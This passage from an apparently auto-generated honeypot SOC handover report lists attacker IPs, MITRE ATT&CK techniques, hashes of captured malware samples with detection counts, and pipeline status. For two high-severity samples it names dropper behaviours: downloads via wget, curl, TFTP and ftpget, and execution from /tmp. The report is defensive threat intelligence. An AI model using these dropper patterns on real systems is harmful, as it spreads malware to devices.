| `213.234.9[.]218` | 1 | 2026-07-20 11:15 | 2026-07-20 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.243.133[.]81` | 1 | 2026-07-20 12:46 | 2026-07-20 12:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-20 11:35 | 2026-07-20 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-20 12:33 | 2026-07-20 12:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `61.145.163[.]164` | 1 | 2026-07-20 12:49 | 2026-07-20 12:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.66.83[.]43` | 1 | 2026-07-20 10:59 | 2026-07-20 10:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]31` | 1 | 2026-07-20 11:12 | 2026-07-20 11:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]227` | 1 | 2026-07-20 11:10 | 2026-07-20 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]230` | 1 | 2026-07-20 11:10 | 2026-07-20 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]75` | 1 | 2026-07-20 11:10 | 2026-07-20 11:10 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]79` | 1 | 2026-07-20 11:10 | 2026-07-20 11:10 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 65/100 | 🟡 MEDIUM | **14/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.151.43[.]172` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 0 |
| `144.123.76[.]123` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 10 |
| `111.70.23[.]240` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `187.8.120[.]90` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `36.74.219[.]125` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 1 |
| `177.72.87[.]7` | BR | BRMOM CONSTRUINDO CONEXOES LTDA | **100** ⚠️ | 50 |
| `114.96.79[.]13` | CN | CHINANET Anhui PROVINCE NETWORK | **100** ⚠️ | 3 |
| `213.176.16[.]218` | NL | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 11 |
| `182.225.134[.]13` | KR | LG POWERCOMM | **100** ⚠️ | 50 |
| `45.227.254[.]156` | BZ | XWIN UNIVERSAL LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 102 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 87 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 112 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 89 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (12.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 87 priority case(s) shown individually · 28 recon entry/entries in table (4 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-20T14:15:11Z_
